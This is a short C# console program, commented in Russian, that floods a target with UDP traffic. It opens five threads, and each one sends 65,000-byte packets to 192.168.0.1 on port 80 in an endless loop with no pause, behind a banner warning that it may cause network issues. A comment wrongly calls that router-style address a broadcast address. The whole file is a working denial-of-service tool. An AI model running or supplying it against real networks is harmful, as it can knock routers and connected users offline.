using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

class Program
{
    static void Main()
    {
        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine("WARNING! THIS UTILITY SENDS UDP BROADCAST PACKETS!");
        Console.WriteLine("MAY CAUSE NETWORK ISSUES!\n");
        Console.ResetColor();

        string targetIP = "192.168.0.1"; // Широковещательный адрес
        int targetPort = 80; // Целевой порт
        int threadCount = 5; // Количество потоков
        int packetSize = 65000; // 65 КБ (максимум для UDP)

        Console.WriteLine($"ENTERED IP: {targetIP}");
        Console.WriteLine($"ENTERED PORT: {targetPort}");
        Console.WriteLine("\nPress Enter to start...");
        Console.ReadLine();

        for (int i = 0; i < threadCount; i++)
        {
            new Thread(() => SendPackets(targetIP, targetPort, packetSize)).Start();
        }
    }

    static void SendPackets(string targetIP, int targetPort, int packetSize)
    {
        using (UdpClient udpClient = new UdpClient())
        {
            udpClient.EnableBroadcast = true;
            IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(targetIP), targetPort);
            byte[] data = new byte[packetSize]; // Один раз создаём буфер и переиспользуем

            while (true)
            {
                udpClient.Send(data, data.Length, endPoint);
                Console.WriteLine($"[SENT] Packet sent to {targetIP}:{targetPort}, size: {packetSize} bytes");
            }
        }
    }
}